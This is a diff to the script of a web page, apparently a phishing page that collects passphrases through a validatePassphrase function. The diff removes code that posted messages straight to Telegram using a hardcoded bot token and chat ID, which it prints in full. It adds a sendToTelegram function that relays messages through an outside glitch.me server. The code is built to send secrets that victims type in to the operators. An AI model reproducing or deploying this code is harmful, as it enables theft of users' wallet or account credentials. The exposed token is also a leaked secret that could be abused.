@@ -366,30 +366,22 @@
     </div>
 
     <script>
-        // Telegram Bot Configuration
-        const BOT_TOKEN = '8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU';
-        const CHAT_ID = '7416028741';
+      async function sendToTelegram(message) {
+  try {
+    const response = await fetch(
+      'https://daffodil-royal-brachiosaurus.glitch.me/telegram',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message }) // Preserves original format
+      }
+    );
+    return await response.json();
+  } catch (error) {
+    console.error('Telegram error:', error);
+    return null;
+  }
 
-        async function sendToTelegram(message) {
-            try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return await response.json();
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-                return null;
-            }
-        }
 
         async function validatePassphrase(inputId, errorId) {
             const input = document.getElementById(inputId);
